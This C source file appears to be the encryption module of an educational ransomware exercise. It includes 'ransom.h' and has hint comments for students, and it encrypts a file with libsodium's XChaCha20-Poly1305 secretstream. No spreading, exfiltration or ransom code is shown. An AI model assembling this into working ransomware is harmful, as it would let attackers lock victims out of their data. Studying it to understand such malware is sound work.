#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 4096

/*
** Here, you have to open both files with different permissions : think of what you want to
** to do with each file. Don't forget to check the return values of your syscalls !
*/
bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath)
{
    *to_encrypt = fopen(filepath, "rb");
    if (*to_encrypt == NULL) {
        perror(filepath);
        return false;
    }

    *encrypted = fopen(optfilepath, "wb");
    if (*encrypted == NULL) {
        perror(optfilepath);
        fclose(*to_encrypt);
        return false;
    }

    return true;
}

/*
** I strongly advise to code near the sources/decryption.c code : it is the opposite process.
** Here, you have to initialize the header, then write it in the encrypted file.
*/
int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    crypto_secretstream_xchacha20poly1305_init_push(st, header, generated_key);

    if (fwrite(header, 1, sizeof(header), *encrypted) != sizeof(header)) {
        fprintf(stderr, "Error writing header to encrypted file\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

/*
** The encryption loop really looks the same than the decryption one.
** In decryption_loop, the crypto_secretstream_xchacha20poly1305_pull is used to retrieve data.
** Think of the opposite of "pull" things... The link provided in the README.md about libsodium
** should really help you.
*/
int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    unsigned char   in[CHUNK_SIZE];
    unsigned char   out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    size_t          rlen;
    unsigned long long out_len;
    unsigned char   tag;

    do {
        rlen = fread(in, 1, CHUNK_SIZE, to_encrypt);

        if (feof(to_encrypt)) {
            tag = crypto_secretstream_xchacha20poly1305_TAG_FINAL;
        } else {
            tag = crypto_secretstream_xchacha20poly1305_TAG_MESSAGE;
        }

        crypto_secretstream_xchacha20poly1305_push(
            &st,
            out,
            &out_len,
            in,
            rlen,
            NULL, 0,
            tag
        );
        if (fwrite(out, 1, out_len, encrypted) != out_len) {
            fprintf(stderr, "Error writing encrypted chunk to file\n");
            return EXIT_FAILURE;
        }
    } while (!feof(to_encrypt));

    return EXIT_SUCCESS;
}